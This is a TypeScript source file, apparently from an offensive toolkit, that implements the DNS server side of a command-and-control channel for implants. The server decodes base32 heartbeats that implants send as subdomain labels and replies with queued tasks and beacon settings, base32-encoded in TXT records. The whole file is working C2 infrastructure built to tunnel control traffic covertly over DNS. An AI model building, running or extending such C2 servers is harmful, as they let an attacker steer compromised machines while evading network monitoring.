import dgram from "node:dgram";
import { ReachRegistry } from "./reach.js";
import { TaskQueue } from "./taskQueue.js";
// @ts-expect-error — base32.js has no type declarations
import base32 from "base32.js";

/**
 * Minimal DNS server for C2 implant TXT record communication.
 *
 * The implant sends base32-encoded heartbeat data as DNS labels
 * (subdomain chunks) and the server responds with base32-encoded
 * BeaconResponse in TXT record format.
 *
 * Run on port 53 (requires root / CAP_NET_BIND_SERVICE).
 */

const A = 1, TXT = 16, IN = 1;

export function createDnsServer(
  port: number,
  domain: string,
  reachRegistry: ReachRegistry,
  taskQueue: TaskQueue,
) {
  const socket = dgram.createSocket("udp4");
  const baseDomain = domain.replace(/\.+$/, "").toLowerCase();

  socket.on("message", (msg, rinfo) => {
    handleDnsQuery(msg, rinfo, socket, baseDomain, reachRegistry, taskQueue);
  });

  socket.on("error", (err) => {
    console.error(`DNS server error: ${err.message}`);
  });

  return {
    start: () =>
      new Promise<void>((resolve, reject) => {
        socket.bind(port, () => {
          console.log(`  DNS server listening on ${port} (domain: ${baseDomain})`);
          resolve();
        });
        socket.on("error", reject);
      }),
    stop: () =>
      new Promise<void>((resolve) => {
        socket.close(() => resolve());
      }),
  };
}

function handleDnsQuery(
  msg: Buffer,
  rinfo: dgram.RemoteInfo,
  socket: dgram.Socket,
  baseDomain: string,
  reachRegistry: ReachRegistry,
  taskQueue: TaskQueue,
) {
  try {
    if (msg.length < 12) return;

    const id = msg.readUInt16BE(0);
    const flags = msg.readUInt16BE(2);

    // Only handle standard queries
    if ((flags & 0x8000) !== 0) return; // response bit set — skip

    // Parse question section
    let offset = 12;
    const labels: string[] = [];
    while (offset < msg.length) {
      const len = msg[offset];
      if (len === 0) { offset++; break; }
      if ((len & 0xC0) === 0xC0) { offset += 2; break; } // compression pointer
      offset++;
      if (offset + len > msg.length) return;
      labels.push(msg.slice(offset, offset + len).toString("utf-8").toLowerCase());
      offset += len;
    }

    if (labels.length === 0) return;

    const qtype = msg.readUInt16BE(offset);
    offset += 2;
    const qclass = msg.readUInt16BE(offset);

    if (qclass !== IN) return;
    if (qtype !== TXT && qtype !== A) return;

    // Join labels into full query name
    const qname = labels.join(".");
    if (!qname.endsWith(baseDomain)) return;

    // Strip domain and "q<N>." prefix to get the base32-encoded payload
    const stripped = qname.slice(0, -baseDomain.length - 1);
    const dotIdx = stripped.indexOf(".");
    let b32encoded = dotIdx !== -1 ? stripped.slice(dotIdx + 1) : "";
    // Remove any dots from label chunking
    b32encoded = b32encoded.replace(/\./g, "");

    let responseData: Buffer;

    if (b32encoded) {
      // Decode base32 heartbeat
      try {
        const hbJSON = base32.decode(b32encoded);
        const heartbeat = JSON.parse(hbJSON.toString("utf-8"));

        // Process via reach registry (same as HTTP endpoint)
        const config = reachRegistry.heartbeat(heartbeat.id ?? "", heartbeat);
        const tasks = taskQueue.poll(heartbeat.id ?? "");
        const br = {
          id: heartbeat.id ?? "",
          tasks,
          ackedResults: [],
          config: config ?? {},
          command: "",
          nextBeacon: config?.beaconInterval ?? 60,
        };
        responseData = Buffer.from(JSON.stringify(br));
      } catch {
        responseData = Buffer.from("{}");
      }
    } else {
      // A-record probe — return minimal info
      if (qtype === A) {
        responseData = Buffer.from([0, 0, 0, 0]); // 0.0.0.0
      } else {
        responseData = Buffer.from("{}");
      }
    }

    // Encode response as base32 for TXT or raw for A
    let answerBuf: Buffer;
    let answerType: number;

    if (qtype === TXT) {
      const b32resp = base32.encode(responseData).toString("ascii").replace(/=+$/, "");
      const txtChunk = Buffer.from(b32resp.slice(0, 255), "ascii");
      const txtData = Buffer.alloc(1 + txtChunk.length);
      txtData[0] = txtChunk.length;
      txtChunk.copy(txtData, 1);
      answerBuf = txtData;
      answerType = TXT;
    } else {
      answerBuf = responseData.length === 4 ? responseData : Buffer.from([0, 0, 0, 0]);
      answerType = A;
    }

    // Build response
    const response = buildDnsResponse(id, qname, answerType, answerBuf, flags);

    socket.send(response, rinfo.port, rinfo.address);
  } catch (err) {
    // Ignore malformed queries silently
  }
}

function buildDnsResponse(
  id: number,
  qname: string,
  answerType: number,
  answerData: Buffer,
  queryFlags: number,
): Buffer {
  const nameLabels: Buffer[] = [];
  for (const part of qname.split(".")) {
    nameLabels.push(Buffer.from([part.length]));
    nameLabels.push(Buffer.from(part, "ascii"));
  }
  nameLabels.push(Buffer.from([0]));
  const qnameBuf = Buffer.concat(nameLabels);
  const ttl = 60;

  // Header
  const header = Buffer.alloc(12);
  header.writeUInt16BE(id, 0);
  header.writeUInt16BE(0x8580, 2); // response + recursion
  header.writeUInt16BE(1, 4); // 1 question
  header.writeUInt16BE(1, 6); // 1 answer
  header.writeUInt16BE(0, 8); // authority
  header.writeUInt16BE(0, 10); // additional

  // Answer: name pointer + type + class + TTL + data
  const answer = Buffer.alloc(14 + answerData.length);
  answer.writeUInt16BE(0xC00C, 0); // name pointer to question
  answer.writeUInt16BE(answerType, 2); // type
  answer.writeUInt16BE(1, 4); // class IN
  answer.writeUInt32BE(ttl, 6); // TTL
  answer.writeUInt16BE(answerData.length, 10); // data length
  answerData.copy(answer, 12);

  return Buffer.concat([header, qnameBuf, answer]);
}
